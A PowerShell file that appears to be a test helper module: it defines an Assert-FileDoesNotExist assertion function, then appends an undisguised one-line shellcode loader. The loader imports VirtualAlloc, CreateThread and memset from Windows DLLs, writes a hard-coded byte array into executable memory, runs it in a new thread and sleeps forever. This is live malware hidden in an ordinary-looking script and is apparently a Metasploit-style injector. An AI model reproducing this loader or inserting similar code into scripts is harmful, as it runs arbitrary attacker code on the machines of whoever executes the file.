













function Assert-FileDoesNotExist
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [string]
        
        $Path,

        [Parameter(Position=1)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    if( Test-Path -Path $Path -PathType Leaf )
    {
        Fail "File $Path exists: $Message"
    }
}


$djr = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $djr -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xcd,0x43,0xe1,0x57,0xdb,0xcd,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x7b,0x0f,0x03,0x7b,0xc2,0xa1,0x14,0xab,0x34,0xa7,0xd7,0x54,0xc4,0xc8,0x5e,0xb1,0xf5,0xc8,0x05,0xb1,0xa5,0xf8,0x4e,0x97,0x49,0x72,0x02,0x0c,0xda,0xf6,0x8b,0x23,0x6b,0xbc,0xed,0x0a,0x6c,0xed,0xce,0x0d,0xee,0xec,0x02,0xee,0xcf,0x3e,0x57,0xef,0x08,0x22,0x9a,0xbd,0xc1,0x28,0x09,0x52,0x66,0x64,0x92,0xd9,0x34,0x68,0x92,0x3e,0x8c,0x8b,0xb3,0x90,0x87,0xd5,0x13,0x12,0x44,0x6e,0x1a,0x0c,0x89,0x4b,0xd4,0xa7,0x79,0x27,0xe7,0x61,0xb0,0xc8,0x44,0x4c,0x7d,0x3b,0x94,0x88,0xb9,0xa4,0xe3,0xe0,0xba,0x59,0xf4,0x36,0xc1,0x85,0x71,0xad,0x61,0x4d,0x21,0x09,0x90,0x82,0xb4,0xda,0x9e,0x6f,0xb2,0x85,0x82,0x6e,0x17,0xbe,0xbe,0xfb,0x96,0x11,0x37,0xbf,0xbc,0xb5,0x1c,0x1b,0xdc,0xec,0xf8,0xca,0xe1,0xef,0xa3,0xb3,0x47,0x7b,0x49,0xa7,0xf5,0x26,0x05,0x04,0x34,0xd9,0xd5,0x02,0x4f,0xaa,0xe7,0x8d,0xfb,0x24,0x4b,0x45,0x22,0xb2,0xac,0x7c,0x92,0x2c,0x53,0x7f,0xe3,0x65,0x97,0x2b,0xb3,0x1d,0x3e,0x54,0x58,0xde,0xbf,0x81,0xf5,0xdb,0x57,0xea,0xa2,0x7b,0x27,0x82,0xb0,0x83,0x26,0xe8,0x3c,0x65,0x78,0x5e,0x6f,0x3a,0x38,0x0e,0xcf,0xea,0xd0,0x44,0xc0,0xd5,0xc0,0x66,0x0a,0x7e,0x6a,0x89,0xe3,0xd6,0x02,0x30,0xae,0xad,0xb3,0xbd,0x64,0xc8,0xf3,0x36,0x8b,0x2c,0xbd,0xbe,0xe6,0x3e,0x29,0x4f,0xbd,0x1d,0xff,0x50,0x6b,0x0b,0xff,0xc4,0x90,0x9a,0xa8,0x70,0x9b,0xfb,0x9e,0xde,0x64,0x2e,0x95,0xd7,0xf0,0x91,0xc1,0x17,0x15,0x12,0x11,0x4e,0x7f,0x12,0x79,0x36,0xdb,0x41,0x9c,0x39,0xf6,0xf5,0x0d,0xac,0xf9,0xaf,0xe2,0x67,0x92,0x4d,0xdd,0x40,0x3d,0xad,0x08,0x51,0x01,0x78,0x74,0x27,0x6b,0xb8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tlx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tlx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tlx,0,0,0);for (;;){Start-sleep 60};

